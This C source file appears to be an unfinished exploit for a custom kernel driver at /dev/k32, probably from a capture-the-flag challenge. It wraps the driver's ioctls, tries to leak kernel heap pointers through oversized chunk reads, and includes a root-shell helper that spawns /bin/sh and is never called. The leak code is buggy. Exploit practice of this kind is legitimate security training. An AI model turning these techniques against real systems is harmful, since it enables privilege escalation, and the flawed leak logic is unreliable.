#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <stdint.h>
#include <errno.h>

#define K32_CREATE  0xb10500a
#define K32_DELETE  0xb10500b
#define K32_READ    0xb10500c
#define K32_WRITE   0xb10500d

int fd;

typedef struct k32_t{
    struct k32_t *next;
    char *buf;
    uint8_t size;
} k32_t;

typedef struct{
    char *buf;
    uint8_t size;
    uint32_t idx;
}req_t;

char buf[48];

void shell(){
    if(!getuid()){
        system("/bin/sh");
    }
    else{
        puts("[!] Failed to Escape");
    }
}

// Function that will hexdump the buffer
void print_buf(unsigned long *buf, unsigned n){
    for (int i = 0; i < n; i++){
        printf("%u: %lx\n", i, buf[i]);
    }
}


uint64_t u64(uint8_t *buf)
{
    uint64_t res = 0;
    for(int i =0 ; i < 8;i++)
    {
        res = res<<8;
        res+=(uint)buf[7-i];
    }
    return res;
}

int k32_create(int fd, int idx, int size){

    req_t *req = malloc(sizeof(req_t));

    req->buf = buf;
    req->size = size;
    req->idx = idx;
    
    int res = ioctl(fd, K32_CREATE, req);

    if (res < 0){
        perror("ioctl");
        printf("k32_create: failed\n");
        return 1;
    }

    printf("k32_create: Created chunk of size %d at %d\n", size, idx);

    return 0;
}

char *k32_read(int fd, int idx, int size){


    char *read_buf = malloc(size);
    req_t *req = malloc(sizeof(req_t));

    req->buf = read_buf;
    req->idx = idx;

    int res = ioctl(fd, K32_READ, req);

    if (res < 0){
        perror("ioctl");
        printf("k32_read: failed\n");
        return NULL;
    }
      
    printf("k32_read: Read %d bytes of chunk %d\n", size, idx);
    printf("Chunk Data: %s",read_buf);

    for (int i = 0; i < size; i++) {
        printf("%02x", read_buf[i]);
    } 

    printf("\n");

    return read_buf;
}

int k32_delete(int fd, int idx){
    req_t *req = malloc(sizeof(req_t));

    req->idx = idx;

    int res = ioctl(fd, K32_DELETE, req);

    if (res < 0){
        perror("ioctl");
        printf("k32_delete failed\n");
        return 1;
    }
 
    printf("Deleted chunk %d\n", idx);
    return 0;
}


unsigned long leak_heap(){
    char *dump = malloc(0x20);

    k32_create(fd,0,0xff);
    dump = k32_read(fd,0,0x20);

    ///*
    for (int i = 0; i < 4; i++){
        k32_create(fd,i,0xee);
    }
    //*/

    print_buf((unsigned long*)dump,10);


    printf("[*] Leaked heap 0x%lx\n", (dump[2] & 0xfffffffffffff000));
    printf("[*] Leaked heap 0x%lx\n", (dump[2] & 0x000));
    
}

int main(void){
    fd = open("/dev/k32", O_RDWR);

    if (fd == -1) {
        perror("Failed to open the device");
        return 1;
    }   

    leak_heap();
    /*
    for (int i = 0; i < 10; i++){
        k32_create(fd,i,0x30);
    }
    */
    
    /*
    for (int i = 2; i < 7; i++){
        k32_delete(fd,i);
    }


    for (int i = 0; i < 10; i++){
        k32_read(fd,i,0x30);
    }
    */

    
    return 0;
}
